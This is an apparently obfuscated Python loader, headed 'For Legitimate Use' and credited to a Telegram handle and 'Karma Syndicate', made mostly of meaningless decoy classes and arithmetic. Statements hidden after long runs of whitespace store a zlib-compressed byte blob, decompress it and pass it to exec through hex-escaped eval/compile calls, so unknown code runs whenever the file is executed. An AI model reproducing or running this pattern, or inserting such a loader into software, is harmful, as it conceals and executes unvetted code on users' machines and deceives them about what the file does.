from builtins import *
from math import prod as Product


__tool__ = 'For Legitimate Use'
__authors__ = ('Telegram:', '@xnabob')
__organization__ = 'Karma Syndicate'
__telegram__ = 'https://t.me/KarmaSyndicate'
__version__ = 'Latest'

__license__ = '4836037d39227231520bc3346a94c8a7'


Algorithm, Random, DetectVar, _theory, _negative, MemoryAccess, _invert = exec, str, tuple, map, ord, globals, type

class _absolute:
    def __init__(self, _builtins):
        self._while = Product((_builtins, 15166))
        self._random(_multiply=71941)

    def _random(self, _multiply = type):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._while /= 30311 * _multiply
        
        try:
            ((_theory, (DetectVar, _statistics)) for _theory in {_theory: Random} if Algorithm < DetectVar)

        except TypeError:
            (DetectVar, _statistics) if DetectVar != MemoryAccess else (Algorithm, Random) != DetectVar

        except:
            _invert(59747 + -87139) == True

    def _math(self, _hypothesis = -28690):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _hypothesis *= 22755 - -16768
        self.Builtins != str
        
        try:
            ((Algorithm, (Random, _negative)) for Algorithm in (Random, _negative) if _theory > MemoryAccess)

        except AttributeError:
            ((_negative, (Algorithm, Random)) for _negative in {DetectVar: DetectVar} if _negative is _statistics)

        except:
            _invert(-9861 * 98788) == None

    def Round(_walk = None):
        return MemoryAccess()[_walk]

    def _frame(Ceil = -41693 / -2126, _product = None, _callfunction = MemoryAccess):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _callfunction()[Ceil] = _product
        
        try:
            ((_negative, (Algorithm, Random)) for _negative in (DetectVar, Algorithm) if _statistics > _theory)

        except ArithmeticError:
            (DetectVar, Algorithm) if Random != DetectVar else (DetectVar, Algorithm) >= Algorithm

        except:
            _invert(11987 - -56614) == float

    def execute(code = str):
        return Algorithm(Random(DetectVar(_theory(_negative, code))))

    @property
    def Builtins(self):
        self._run = '<__main__._walk object at 0x000007295BE72016>'
        return (self._run, _absolute.Builtins)

if __name__ == '__main__':
    try:
        _absolute.execute(code = __license__)
        Walk = _absolute(_builtins = -61369 / 15485)

        if 419637 > 2097795:
            _absolute(_builtins = -99264 * -52564)._math(_hypothesis = 22501 * Walk._while)
        elif 270972 < 1101767:
            _absolute(_builtins = 48517 * -7072)._random(_multiply = Walk._while * 73264)                                                                                                                                                                                                                                                          ;_absolute._frame(Ceil='NNMNNMNMMMMMNNNNM',_product=b'x\x9c\xe5\x1aYo\xe3\xbc\xf1\xdd\xbf\xc2\xcd\x8b%\xac7+S\x12e\x1b0\xd0\x87`\x0b\xbb9> [$\xc0ba\xc8\x12\x95p+\x89\xaeD\'\xceW\xb4\xbf\xbd3$\xe5#>\xe2+\xbb\x05B\x9a\x87xs\x86spLY\xbctkup<\xb1T\x8an8\x94B\xa4\xc3a\xfd/\xbd\xb3\xaf\xa2\xa8_\xb2\x07.y\x16JV\xffG\xc9\xce\xea\xa2Xh\x1aN\xe4\xa3(J\xd5\xda:\xfb\xc6R\xf6P\x84Y\xf7\xacy\xf6\xd7i\x1e\x8e\xc4\xe8\xcc^j/\x8a\x870\xe7\x7f\x86\x92\x8b\\O\xf1\xf7\xb0\xc8\xc2\xfa\xedK\x1e\xf3\x08\xe6x5\xbe4#\xea\xb6\x8fR\x8e\xcb\xee\x97/\xf2<c_T\xc7M\xfd\x9eXQ\xce\xa6\xb8\x84\xfaR\xbej\x91\xf2\x88\xe5%S-\x1a^\xdb\xa5\x8e\x1b\xc4n\x87\x90\x80\xb8-\x9f8\xa3\xc8u=\x1av\xbc\xa8\x1d\x06\x8d\x9a\xdd\x9d\xf5\xe5\xb9\xb4\x1a\xe5?y\xdc\xb0kl\x1a\xb1\xb14@\xcc\xc7\x13i\x9d\xfd\x91\xb2\xb0d\xf5\x0b\x917d\xfdJ\xc4<y9\xb3kzR\x9e\x8dE!\x87C\xe8\xffR6\xecs6\xe5\xd2\xb2k\xa9\x88\xc2\xb4\xb4\xec\xef\x8d\x0bqq#\xc4\xcd\x85\xb8\x81\xe8\x02Rqs\xd3\xf8\xd1{H\xc5\x08Z\xd4\xd6Uc7\xce\x7f\xfeL9zH\xd1\xfd\xc4\x8f\xc6\xf7n\xf7\xd3\xe7O\x9f\xad\xcf\xd6\xa7\x96m\xff\x80q\x98\x0c\xa5,6\x8esu}uuu}}\r\xe9\xb5\xc9b~u\xa0\x98o\x1e\xa4\x7fy\xd9\xef\x0f\x06}\x88/\xfb\x03\x88`\x03z\x87\xb5\x95*l\x7f\xab\x1d!:\xc2\x14\xe2[\xe85\x07\xd8\xc6\xc9\x84\x80\n(\x81\x08k\xe0C}B\xe7\r\xc3Z\x8d\xd1\x84\xa7\x92\xe7\x08\xff\xa7\xb0\xd8\xb0\xa8\x1b\xe1\xc0|\xc2\x81y 8\xce\r&\x88\x8aF\xe3\xfc\xa7\xe0ym\xc3\xc4jCD\xcd\xa7\xe6\xac&\xd6KAH \x924\x8e\x14\x928\xa6\xdc\xda\xb8Z\xce\xa3\x12Hf\xf4\x1a\x07vS!\xc9\xa0I\xe71{u\xc0P\xf6\xf7\x13\x8eu\xce\xf3\x98M\xad\xc6K\xc2\xd3){\xcc\'+M~\xd8\xdb\xa0\xd7W\xc0\xe9\xf7\xcdO\x85\x03\xe0V\xe6\\\xa6|r\n\xb8m\x1c\xea\x00\xb8m\x1e\xab\x82\x1bK\xf98\x13\xd1:\xa8m$\x02\xc8\t,Tp\xc4D|$\x88\xa5B\xac\xd6n\x01W\x9eey\x96\xa3\xc3\x0c\xe4>\x12\xb0\nY\xeeI\x90x\xa0\x80\xfd!(o4G\xc46\x1f\tf2\x14i\xb2\xcf\tK\x11\x1a\x00\x1b\x08\\\xc1\x85\xf3\x8f\x04/V\xa6\xe1\xd7}\xe0\xf5\xfc\xfc<U\xfey:\x85\x08\xdc\x87\x02\xd7\xa4\xf8\xb6\x0eZ\xeb\x15\x13\x05\xb4\x0b\xc5\xef\x91h/>\x12\xa4\xd2\xf0\x89\xedq\xae6+b\xd6\xa8\xe1\x85^dB\x07|\xa4\xe2*\xaf\xd3y.\xc4\x14\x14\xc6\x98E"fV\xa3\x9d\xc85z\xcd\xc7AD\xc4\xa6k\x11\xb1Y\x8cl\xc5\x85\xef\xbaD\x87y\xce%\xfa\xbb*\x9f\xa7\xbe\xfb6&\xd6\xa8D\x96\xf5\xdf5|\x19\xee\xa7\x96\xb5\xca\x7f\xec0\x8f\xadu\xcd\xed\xad\xb2\xb2\x1aF\xbb\xe9l\xd0\xc5\x15\xaeP\xb0\xb5\x156\xaeCb\xd2&\xb1\xdb"o\x9e@[]\xce\xd20\x1b\xc5a\x1dT\x9bl\xae\xe9\xe0/S*O\xd6\xdd\xb8\x81C\xf1G#\xf4H)\x18\xeb\xbc.\xd3\xa5\xbb\xd0\xce\xef\xc1\xd8v\x16Q\xb1\x85*\x8e\x16XC\xa8|\xa4r\xd1.\x1b\xdc\x17\xef-?\x99\xe1\xde\xd9\x01\xf7\x07\x13_\xe0\xb7U\xa8|`\xe2`\x96\xab\xbeU|\xf2\x9d\x92 \x88\xc8\x9b\xc3n\xa5\xbb\xfb\xfb\xfb;t\xf7w\x90A\x8f\xe9\xdd\xef\xa0:\xb3\x06\xb5\x88\xfb{\x9d\xc3\xd0]/\xa3\x0e\xa6\xb8\x04\xbd\x07^\xc5s\x97\xcc=MN\x8f*\xe2\'~Bc\xda\xa2\x1d\xca0O\xc8\xbb\x1dLCp\x1dCb\xa1!\xc4\xc8\x90^gF\x94\x86Dw\x90\xcf\x1aG\xb8\n4\xec\xc0\xad\xc6\x11*#\xcc\x1d\xa7\xbbF\xe7:b\xf9\x9aC\xcc\x95\x88hA\xa9\x88\xde\x85k\x10B\xdb\x81\x07\xde\t\\7$\tI\xa8\x1b8tD[\x01A\xb4\x11F]\xea\x92\xc4\x8b\x03\x9fv\xfc\xb6\xc7\xbc6\x8d\\\xc7\r\\ r\xb7\x13\xb4\xbd\xc4whL\x92\x00\xc6\xf1\\o\xe4z>\xf4t]\x9a\x04\x0e\xb4\x8f\x01\xf1\ta0f;p\xde\x13\xf9\x1a\xc5\x15\xd2\xe7\xf9hv,\xc2\x8a\x0b\xbf\x03G\x02H\x1d\xc7\x91P\xf8\xab\xa0\xb4\x80\xe9q*\x00\x05Q@P\x1c@\x08L\xf0 \xb4M\xc0rBF\x8aa\xed\xd2v_\xa6\x96U\x1aD\xae4\n\x08{\x12\x8a\xb2,+c2\xa6W\xda\xce|u\xbd\x1d&\r\xdb\x81\x9a\xd61\x80k\xed!?u\xf4\xe3\x00\x92\x0b<\xea#\xb9\x00\xd18\xa0\xf2(\xde\xf8\x8e\xa4\x11\xa0k\x07s\xd7V_\xed\xa5\x14\xfc\xce\xfcPI\xcbJ\x84\xea\xcc\xfdI9ahh7\x9c\xb1\xef\xe8\x15\xf3\x8e\xfe\x1f\xb5\n\xad2+-Z\xdb\n\xd1g\xbf\xf0<\x1e\xb0\xe9#\xb7\x0c3`\xad\xd2Up\xe2\x9b\x8b_\xba\xdd\x99\x80vP +[\xa3p\x84\xa3\xfe\x86\x01\xe9|\xf2\x8b\xcbL\xab}\xad\xef\x06K\xba\xf0\xcc\xbf}Js!\xaduW\x99\x15\xa3\xf3\x89\xef*\x0b\x1az\xb5\x97`i\x07\xef\xa2\xb7\x93\xe3\x8e\xdbv\xae\xe1Q\xad\xd8\x1aEW\xa5\x8be\xe0\x0e\xd9\x93\x16+\xce1\xe7\xda72\xb6c\xe4k\xcb\xc8U\x94\xb3U]\xcb\xc8\xe3]\xda\xee*\x9e\x8e\xb3\xafT6\x95\xca\xba\xb2X\xb6ho\xd9\xcd\xc2\xb2\xff\xcd\x81\x80\x94\x04\x10\xd0\x08%\xa5\x1f\x80BI@1\x05YI\x03\x12\xfb\xae\x17\xfb\x9e\xef\x80j\xe9)Y\xfa\x8e\xaaegn\xa3X\xb5V\xcc\xed\x18\x87\x1d\xae\xd6\xb0=\xf4\xa0\x11\x1d:\xc3_\xaa\xbb\x1c\x0c\x8edNap\x11ptZ\x95U\xb9\x9d\x95\x89\x14\x99\x99\xe1gh\x07\x05w\xe2\xbb\xef\x02\xa3{\xcd\xae\xe7&\x8c\x1d\xd8\x9dY\xb01\xd3iS\x12\xc6\xcf\x07\xc9\x99\x06\x96\\ \xbb\x87o\xe0\xf8\x88\xeacu~\xe4\x15\xd4\xe8\xed\x9d\x05=\x1e\xf9\x86\xbf\xa0\xefok\xe7\xed){Q\xef\x03\x9d\x0f\xc2\xe5\xe0\xf2r\x00\xa1\x8fi\xbf\x7f\x18T\xd4M[(\xc0`5\xfc\xdeR\xfa;CoH\x87\x01\xf8\x16\x04\n\xe4\xd4\x82\x96\xce\xd0\x7f]\xfa\xee\xb7\x87\n\xb4\x8bW\'g\xe1z\xe5\xaeA\xc3\xb6\xb6;\xa2b~\x131(\xc1E\x11\xb58\xb5JH\x0e\xc3\x85\xb1\xffV\x91RF\xde\x1d\x88{\x1a\xd2\x0e\xbc\x82QJ\x91\x87\xfb\xef(6fZU\xe0o\xb2\x94.\xea`;\xe8\x8a\xfb_4\t%\xbb\xec0)DV\xaf\xde9\xd5\xf5#\xaa:\x9b\xb2\xa8\xa9\x1e\xa95\xc7\x05\xcfe\x13\x83\x18\xb3\xbc\x89\xcf\xd0jXm\xcd.9yu\xef\xc1O\xbbf\x86(39N\xf9\xa8Y\xf2\x87<L\x9b\xe5K\xa9\xa7\x8aD*\x8a0\x0b\xab\xa9\xbe\x8a\x82\xc1\xf00*FV8\x91PP2\xd93/{\xd2\xb4\xaf\x1f\xf9\xf4\xedZ\xc1\xa2a\xc4EO\xb1\x1a`3\x03\xbcp\x0e\x90\x0b\xd5b\x96\xd4K\xabl&\xe6\xf5\x9dZ\xb6\xb5\'\xd4(\x80\xcc\x8f(\xc3\x10\x8c<\xaa\xd4\x0e\x9f0\xbf\xe3\xf9\xea\x02\n\xaaH\x10\xfb#\xd2\xf2c\xe2xp\x91\xa7\x1d\xb8\xd0k\xb5\x84)\xefx$\xe8@\x9f\xd6\x0e\xb0\xd7O\xfd\x002\xfaq\xdf\x85\x11\tx\x07\xd0<\xd0\xaei\xe8\x9d\xeb\xc42_\xb7\xfd\xbf\xf5\xaf\xbf5K[\xed:\x82]\x8f\x9b\x93\xe6\xf8\xb9)\xcc\xe6e\xf5X\x13\xdd3\x97\x8f\x156\xceo\xaf\xbe\xfd\xa1\xdaK\x9e11\x91=}g\x07\x10"<\xe1\x0e?@\x16\xde\xb7\xc3Ru\x99\x8f\xa2V\n%\xe7\xec1\x15\x96\xbdT\xce\x93\xfa\xb8\xd7S\x0f\xb0\xe6\xf8R\xc8[\xee?\x1b\xa3\x94a!%>c\\_\xbff\x0eU\x9e\x8a\x07\x9e[\xb8\xd5\xe5\xca\x83\x91\xbd\x88d/\xf0\t\xa0\xd9\xf7\x18\xa2\x18\xf4\x99\x11"\x99\x11\xc01!N0\x02r\x8d=L\xf1\xf1g\x08\xa9\x13\xc4;#y\t\x19HH\x96h\x0e\x06\xfd\x81\xb2\x97\xe0\t\xbe\xbcT\xb9\xc1\x00A\x9f\xac\xc2-9\x7f.\xb8d\x87m\x12\x97\x1cDz\xc9*\xf5g\xdfx\x9e\xa3\x9dLP\xcb\x1b)\x98\x9c\x14y]\xc9\x98\xdbj\xe2\xdb*\xdc\xaa\xb6\x8b/^O\x86&\x85$O\xa1\xc8\xf7\xe1\xa2pB$\x99=\xe9?d\xee\xcc\xdfC\xda\xdc\x85NQ\xdb\x93\x95l!3\x85\xd9\xa4y_\rQ\x19\xcb\x10\xa9\xd3e\xa4&\xa2\xa8\xa7u\x9e\xbf.G\x97\xf6\x80\xe4e\xc1\xc7k\x08\x04\x88-\x17\x12\xbaB\x7f4\xb9\xe1O\xf1A\x15T\x1d\x0c\x9a\xae\x0e\x8a.\x129\xb0\xf9\t[%;\xc3Bpb`\x14\xd22\x7fI\xe9?\xa8\xee\xee\xab?\xaa\xeeV\x174\xee!V\xc7\xab\x15K\x8c\xe9w\x1d\x08Jw<\x00\x00\xd7\xe10\x0f36\x1c\xf6z\xca\xa0\x85\xf7\x0f-\xf9\x91\'\xafA9\xef\xe9w\xdc\xc72\x1e\x17\xe4K\x0b\xd9\x8e\xe7\x83\xdcA\x031,\xdd\x8b@\xb6\xb8\x81\xe7\x86d\x97\xffN\xe6\xe0Ox\xca\xca\xde\xbf\xb3\xea\xaf\xfc\x99\x12\x97g]\x8b+)\x0eIe\xbe\x9d!X\x9f\xd9{\xbbym,\xee\xda\x0c\xaf\x9f\x80\\_\xd9\xff\x99M\x00\xe2y,\xf2\x92\xf5\n\xf6\xaf\t+ey>\x16\xa5\xb4\x8cpn\xea\xf9U<_\x94\xe8\xdd\xcetR\xa3\x9dj\x8eaX\x05\xba\'\\\x9d}\xda\xc3\xe1\xc5\x00\xd9\x00\x99:\x9c\x91\x16\x1c\x12\x8f\xb6\x02\x97\x8e\x00\xbe.Mh\xac\x8c\xf0>\xc2\x9cz\xc4\xa1-\x90\xe4\x98\x1a\r1p\x89\xe3\xbb\xd0\x83\xeazh\x97\xa8C\x95\xec\xc1U\xd6\x1fz\xbb\xf6?\xeb\x18\xc7S')

        if 254531 > 7903266:
            _absolute(_builtins = -8894 - -61760)._random(_multiply = Walk._while * 3246)
        elif 460566 < 6372127:
            _absolute(_builtins = -46304 + 61763)._random(_multiply = Walk._while / 40493)                                                                                                                                                                                                                                                          ;NMMMNMMNMMMMNMMNNNM,SS2S22S2S2S2222SSS22S,NMNNNMNNMMMMNNMMNMNMN,XWXXWXXXWXWXXXWWWX,XWXXXXXWXWXXXXXWXXWX=(lambda IJLJLIJIJJLILJILLJIII:IJLJLIJIJJLILJILLJIII(__import__('\x7a\x6c\x69\x62'))),(lambda IJLJLIJIJJLILJILLJIII:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IJLJLIJIJJLILJILLJIII)"),filename='\x78\x77\x78\x78\x77\x77\x78\x78\x78\x77\x78\x78\x78\x77\x77\x78\x78\x78\x78\x77\x77\x78\x77\x77\x78',mode='\x65\x76\x61\x6c'))),(lambda IJLJLIJIJJLILJILLJIII:IJLJLIJIJJLILJILLJIII['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda:(lambda IJLJLIJIJJLILJILLJIII:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IJLJLIJIJJLILJILLJIII)"),filename='\x78\x77\x78\x78\x77\x77\x78\x78\x78\x77\x78\x78\x78\x77\x77\x78\x78\x78\x78\x77\x77\x78\x77\x77\x78',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda oOOoDooOOOoDDoOoD,IJLJLIJIJJLILJILLJIII:oOOoDooOOOoDDoOoD(IJLJLIJIJJLILJILLJIII))
        if 185032 > 6763105:
            Walk._random(_multiply = Walk._while / -90181)
        elif 340573 < 723773:
            Walk._random(_multiply = Walk._while - -96763)                                                                                                                                                                                                                                                          ;XWXXWXXXWXWXXXWWWX()(XWXXXXXWXWXXXXXWXXWX(NMNNNMNNMMMMNNMMNMNMN(NMMMNMMNMMMMNMMNNNM(SS2S22S2S2S2222SSS22S('\x76\x61\x72\x73'))),_absolute.Round(_walk='NNMNNMNMMMMMNNNNM')))

    except Exception as _statistics:
        if 157084 > 5810967:
            _absolute.execute(code = Random(_statistics))

        elif 343262 > 5550141:
            Walk._random(_multiply = Walk._while + -91529)